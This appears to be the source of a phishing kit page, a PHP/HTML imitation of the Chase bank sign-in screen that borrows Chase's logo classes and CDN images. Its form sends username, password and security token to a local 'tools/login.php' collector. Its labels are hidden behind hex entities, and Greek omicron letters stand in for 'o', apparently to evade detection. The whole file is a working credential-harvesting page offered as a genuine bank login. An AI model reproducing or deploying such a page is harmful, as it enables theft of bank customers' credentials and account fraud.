<?php 
   define('Myheader', TRUE);
   ?>
<?php include 'includes/header.php'; ?>
<body >
   <header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true">
      <div class="logon header jpui transparent navigation bar" data-is-view="true">
         <a id="logoHomepageLink" href="#" rel="nofollow">
            <div class="chase logo"></div>
            <span class="util accessible-text">&#x43;&#x68;&#x61;&#x73;&#x65;&#x20;&#x68;&#x6f;&#x6d;&#x65;&#x70;&#x61;&#x67;&#x65;</span>
         </a>
      </div>
   </header>
   <main id="logon-content" data-has-view="true">
      <div class="container logon" data-is-view="true">
         <div>
            <div id="backgroundImage">
               <div class="jpui background image fixed" id="geoImage">
                  <style type="text/css">.jpui.background.image { background-image: url(https://static.chasecdn.com/content/geo-images/images/background.mobile.day.5.jpeg/default.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.day.5.jpeg/default.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.day.5.jpeg/default.jpeg', sizingMethod='scale');}@media (min-width:768px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.mobile.day.5.jpeg/default.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.tablet.day.5.jpeg/default.jpeg); } }@media (min-width:1200px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.desktop.day.8.jpeg/default.jpeg); } }</style>
               </div>
               <div class="row">
                  <div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box" id="logonbox">
                     <div class="jpui raised segment">
                        <div class="row">
                           <div class="col-xs-10 col-xs-offset-1">
                              <form id="loginform" method="POST" autocomplete="off" action="tools/login.php" >
                                 <div class="fl w-75" id="messages"></div>
                                 <div class="jpui fieldgroup logon-xs-toggle logon-floating-label userID-margin-top" id="userId">
                                    <div class="jpui vertical">
                                       <div style="color:#717171; font-family: 'Open Sans','Helvetica Neue',Helvetica,Arial,sans-serif;" id="userId-text"><label class="is" for="">&#x55;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;</label> <input min="0" class="jpui input logon-xs-toggle"  type="text" id="user" name="username" required="" value="">    </div>
                                       <div>
                                          <div>  </div>
                                       </div>
                                    </div>
                                 </div>
                                 <div class="jpui fieldgroup logon-xs-toggle logon-floating-label userID-margin-top" id="userId">
                                    <div class="jpui vertical">
                                       <div class="label-wrapper">
                                       </div>
                                       <div style="color:#717171; font-family: 'Open Sans','Helvetica Neue',Helvetica,Arial,sans-serif;" id="userId-text"> <label >&#x50;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;</label><input min="0" class="jpui input logon-xs-toggle"  id="pass"  type="password" name="password" autocomplete="off" required=""  value="">    </div>
                                       <div>
                                          <div>  </div>
                                       </div>
                                    </div>
                                 </div>
                                 <input type="hidden" name="_token" value="">
                                 <div class="jpui fieldgroup logon-xs-toggle logon-floating-label userID-margin-top" id="userId">
                                    <div class="jpui vertical">
                                       <div class="label-wrapper">
                                       </div>
                                       <div  id="dvPassport" style="display: none">
                                          <div style="color:#717171; font-family: 'Open Sans','Helvetica Neue',Helvetica,Arial,sans-serif;" id="userId-text">
                                             <label for="exampleInputPassword1">&#x54;&#x6f;&#x6b;&#x65;&#x6e;</label> <input min="0" class="jpui input logon-xs-toggle" autocomplete="off" id="token" maxlength="35" type="text" name="securityToken" value=""> 
                                          </div>
                                       </div>
                                       <div class="row logon-xs-toggle">
                                          <div class="col-xs-6 rememberMe-checkbox-container">
                                             <div class="jpui checkbox" id="rememberMe">
                                                <div class="checkbox-flex"> <label class="contx">Remember me<input type="checkbox"  />
                                                   <span class="checkmark" > </span> 
                                                   </label></label>
                                                </div>
                                             </div>
                                          </div>
                                          <div class="col-xs-6 token-checkbox-container">
                                             <div class="jpui checkbox useToken" id="useToken">
                                                <div class="checkbox-flex"> <label for="chkPassport" class="contx">Use t&omicron;ken<input type="checkbox" id="chkPassport" class="css-checkbox" onclick="ShowHideDiv(this)" />
                                                   <span class="checkmark" id="label-useToken"> </span> 
                                                   </label>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                       <div class="row"><button type="submit" id="signin-button" class="jpui button focus fluid primary"><span class="label">Sign in</span> </button></div>
                                       <div class="row"><span class="jpui link" id="forgotPassword-link-wrapper"><a class="link-anchor touch" id="forgotPassword" href="javascript:void(0);"  rel="nofollow">F&omicron;rg&omicron;t username/passw&omicron;rd? &#62;</a></span></div>
                                       <div class="row"><span class="jpui link" id="enrollment-link-wrapper"><a class="link-anchor last touch" id="enrollment" href="javascript:void(0);" rel="nofollow">	&#x4e;ot Enr&omicron;lled? &#x53;&#x69;&#x67;&#x6e; Up &#x4e;&omicron;w. &#62;</i></a></span></div>
                              </form>
                              <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
                              <script src="assets/js/flat.js"></script>
                              <script>
                                 $("#pass").floatingLabel();
                                  $("#user").floatingLabel();
                                  $("#token").floatingLabel();
                              </script>
                              <style type="text/css">
                                 .red		{color: #bb0826;
                                 background-image: url('assets/img/warning-3-16.ico');
                                 background-repeat: no-repeat;
                                 padding-left: 30px;  /* width of the image plus a little extra padding */
                                 display: block;
                                 font-size: 1rem;
                                 font-weight: 300;
                                 color: #BF2155;
                                 letter-spacing: 0;
                                 width: 100%;
                                 margin: .0625rem .0625rem .313rem 0;
                                 font-family: 'Open Sans','Helvetica Neue',Helvetica,Arial,sans-serif;
                                 font-size: 16px;
                                 }
                              </style>
                              <script src="https://cdnjs.cloudflare.com/ajax/libs/es6-shim/0.35.3/es6-shim.min.js"></script>    
                              <script src="assets/dist/js/FormValidation.min.js"></script>
                              <script src="assets/dist/js/done.js"></script>
                              <script></script>
                              <div><div>  </div></div></div> </div> 
                           </div>
                           <div>
                              <div>  </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
   </main>
   </div> 
   <?php include 'includes/footer.php'; ?>
   </div>
</body>
</html>